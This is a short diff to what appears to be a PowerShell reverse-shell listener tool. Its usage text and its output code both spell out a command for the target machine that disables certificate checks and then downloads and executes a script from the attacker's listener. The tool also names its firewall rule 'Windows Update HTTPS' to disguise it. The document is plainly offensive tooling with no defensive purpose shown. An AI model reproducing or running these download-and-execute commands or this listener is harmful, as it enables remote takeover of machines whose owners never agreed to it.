@@ -9,7 +9,7 @@ This script starts a listener on the attacker's machine. The listener listens on
 
 On the target machine execute the below command from PowerShell:
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-iex (New-Object Net.WebClient).DownloadString("https://IPAddress:Port/connect")
+iex (New-Object Net.WebClient).DownloadString("https://ListenerIPAddress:Port/connect")
 
 The listener opens incoming traffic on the specified port. The firewall rules are named "Windows Update HTTPS".
 
@@ -158,7 +158,9 @@ do
 
     $listener.Start()
     Write-Output "Listening on $Port"
-    Write-Output $CertPinThumbprint
+    Write-Output "Run the following command on the target:"
+    Write-Output "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};iex (New-Object Net.WebClient).DownloadString(""https://$IPAddress`:$Port/connect"")"
+
     $Client = New-Object System.Net.Sockets.TcpClient
     $Client.NoDelay = $true
 
